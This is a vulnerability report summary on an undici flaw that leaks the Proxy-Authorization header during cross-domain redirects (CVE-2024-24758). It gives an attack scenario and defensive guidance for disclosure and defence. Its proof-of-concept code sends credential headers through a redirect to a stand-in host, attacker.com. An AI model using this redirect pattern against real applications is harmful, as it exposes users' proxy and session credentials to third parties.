# Proxy-Authorization Header Leakage in Cross-Domain Redirects (undici)

## Metadata
- **Source:** HackerOne
- **Report:** 2352957 | https://hackerone.com/reports/2352957
- **Submitted:** 2024-02-02
- **Reporter:** timon8
- **Program:** undici (Node.js HTTP client)
- **Bounty:** Not specified in report
- **Severity:** medium
- **Vuln:** Information Disclosure, Credential Leakage, Improper Header Handling
- **CVEs:** CVE-2024-24758
- **Category:** web-api

## Summary
The undici HTTP client library fails to strip the Proxy-Authorization header during cross-domain redirects, potentially exposing proxy credentials to third-party sites. While Authorization and Cookie headers are cleared during such redirects, the Proxy-Authorization header is overlooked, leading to unintended credential leakage.

## Attack scenario
1. Attacker hosts a malicious website or compromises a legitimate site to inject a redirect
2. User's application makes an HTTP request to the compromised site using undici with Proxy-Authorization header set
3. The malicious site responds with a redirect (3xx status) to an attacker-controlled domain
4. undici automatically follows the redirect to the attacker's domain without clearing Proxy-Authorization
5. Attacker's server receives the Proxy-Authorization header in the request
6. Attacker can now use the proxy credentials to access resources through the proxy on behalf of the victim

## Root cause
The cross-domain redirect security filter in undici only strips Authorization and Cookie headers but does not include Proxy-Authorization in the list of sensitive headers to be cleared. This inconsistency with the WHATWG Fetch specification and other HTTP client libraries (like Python's requests) leaves proxy credentials exposed.

## Attacker mindset
An attacker would exploit this to harvest proxy credentials from applications using undici. This is particularly valuable if the proxy enforces authentication and controls access to internal resources. The attacker could redirect victims to their server and passively capture credentials without any code execution or direct compromise needed.

## Defensive takeaways
- Ensure all authentication-related headers (Authorization, Proxy-Authorization, Cookie, etc.) are cleared during cross-domain redirects
- Consult WHATWG Fetch specification authentication-entries for the complete list of sensitive headers
- Align implementation with industry-standard HTTP clients (requests, curl, etc.) for consistency
- Consider limiting maximum redirections and implementing explicit redirect policies
- Use explicit credential handling rather than relying on automatic header stripping
- Monitor and log redirect chains for suspicious patterns

## Variant hunting
Check other headers that might inadvertently leak sensitive information during redirects (e.g., Authorization-X, X-API-Key, X-Access-Token)
Test redirect chains with other sensitive header combinations
Verify behavior with relative redirects vs absolute cross-domain redirects
Check if other HTTP client libraries have similar oversights
Test with different redirect status codes (301, 302, 303, 307, 308) for consistency

## MITRE ATT&CK
- T1598.003 - Phishing: Spearphishing Link (redirect-based credential capture)
- T1187 - Forced Authentication (proxy credential extraction)
- T1040 - Network Sniffing (passive credential capture via redirect)

## Notes
The vulnerability references Python requests library's proper implementation as a comparison point. The WHATWG Fetch specification explicitly defines which headers should be treated as authentication entries and cleared during cross-origin requests. This is a logical security gap in undici's redirect handling that affects all applications using the library with proxy authentication.

## Full report
<details><summary>Expand</summary>

## Steps To Reproduce:

I read this security advisory https://github.com/nodejs/undici/security/advisories/GHSA-wqq4-5wpv-mx2g.
It only clears authorization and cookie header during cross-domain redirect .
{F3024496}
As such this may lead to accidental leakage of "Proxy-Authorization" to a 3rd-party site.
```nodejs
import { request } from 'undici'
const {
    statusCode,
    headers,
    body
} = await request('http://anysite.com/redirect.php?url=http://attacker.com:8182/vvv',{
    maxRedirections: 3,
    headers: {
        "autHorization": 'tes123t',
        "coOkie": "ddd=dddd",
        "X-CSRF-Token": 't5k3zni6fbdqbnce58zbkh7c4o',
        'Proxy-Authorization':'xxxxxxxx'
    }})

console.log('response received', statusCode)
console.log('headers', headers)

for await (const data of body) {
    console.log('data', data)
}
```
{F3024501}


You can refer to this python code.
https://github.com/psf/requests/blob/main/src/requests/sessions.py#L318

References
https://github.com/psf/requests/issues/1885
https://fetch.spec.whatwg.org/#authentication-entries

## Impact

undici v6.5.0

</details>

---
*Analysed by Claude on 2026-05-24*
